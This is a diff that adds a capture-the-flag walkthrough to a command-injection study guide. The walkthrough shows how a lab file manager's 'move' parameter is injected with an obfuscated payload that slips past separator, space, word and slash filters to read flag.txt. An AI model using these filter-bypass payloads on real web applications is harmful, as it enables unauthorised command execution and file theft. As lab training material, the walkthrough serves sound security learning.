@@ -14,6 +14,7 @@ This document summarizes core techniques for discovery and exploitation of **com
         - [Word Filters - Part 1](#word-filters---part-1)
         - [Word Filters - Part 2](#word-filters---part-2)
         - [Automated Obfuscation Tools](#automated-obfuscation-tools)
+    - [Exploitation Example - Walkthrough](#exploitation-example---walkthrough)
 
 
 ---
@@ -475,3 +476,98 @@ For example:
 
 ---
 
+## [Exploitation Example - Walkthrough]
+
+We are provided with the target address `94.237.54.192:46770` and valid credentials (`guest:guest`). The objective is to retrieve the contents of the file `flag.txt`.
+
+After authenticating, the application presents itself as a web-based file manager.
+
+![Filtered output](images/walkthrough1.png)
+
+Once logged in, a list of files is displayed. The interface allows users to perform actions such as **preview**, **copy**, **move**, and **download**.
+
+![Filtered output](images/walkthrough2.png)
+
+Selecting a random file and choosing the copy to action reveals two GET parameters in the request:
+
+```
+http://94.237.54.192:46770/index.php?to=&from=51459716.txt
+```
+
+![Filtered output](images/walkthrough3.png)
+
+The same parameters (`to` and `from`) are observed when selecting the **move to** action. Based on this behavior, it is reasonable to assume that the application executes back-end commands resembling:
+
+```bash
+cp <src> <dst>
+mv <src> <dst>
+```
+
+Copying a file to the `tmp` directory succeeds, indicating that the functionality works as intended:
+
+```
+http://94.237.54.192:46770/index.php?to=tmp&from=787113764.txt&finish=1
+```
+
+![Filtered output](images/walkthrough4.png)
+
+We begin testing for command injection by appending common command separators to the `from` parameter. However, all injected separators are treated as literal input and incorporated into the error message, rather than breaking out of the command context:  
+
+```
+http://94.237.54.192:46770/index.php?to=tmp&from=787113764.txt%26&finish=1
+```
+
+```
+Error while copying from <file1>& to <file2>&
+```
+
+![Filtered output](images/walkthrough5.png)
+
+After testing multiple separators, we conclude that the `copy` functionality is not vulnerable to command injection.
+
+We proceed to test the `move` functionality. Unlike the `copy` operation, attempting to move a file immediately results in the following error message, even without injection attempts:
+
+```
+Malicious request denied!
+```
+
+![Filtered output](images/walkthrough6.png)
+
+This behavior strongly suggests the presence of an input filter or WAF protecting the `move` operation.
+
+We continue probing the `move` functionality by testing different command separators. Because the original `mv` command appears to be blocked, we require a separator that executes the second command even if the first fails.
+
+Testing reveals that both the `&` (%26) and `&&` (%26%26) operators bypass the filter. However, only the `&` operator causes the injected command to execute when the original command fails:
+
+```
+http://94.237.54.192:46770/index.php?to=tmp&from=605311066.txt%26&finish=1&move=1
+
+http://94.237.54.192:46770/index.php?to=tmp&from=605311066.txt%26%26&finish=1&move=1
+```
+
+![Filtered output](images/walkthrough7.png)
+
+This confirms the presence of a command injection vulnerability in the move functionality.
+
+To retrieve the contents of `flag.txt`, we construct a payload that bypasses:
+
+- Blacklisted command separators
+- Space restrictions
+- Word filters
+- Slash restrictions
+
+```bash
+%26c'a't${IFS}${PATH:0:1}flag.txt 
+```
+
+```
+http://94.237.54.192:46770/index.php?to=&from=605311066.txt%26c'a't${IFS}${PATH:0:1}flag.txt&finish=1&move=1
+```
+
+The contents of the `flag` file are returned within the application’s error message:
+
+```
+Error while moving: HTB{c0mm4nd3r_1nj3c70r}
+```
+
+![Filtered output](images/flag.png)
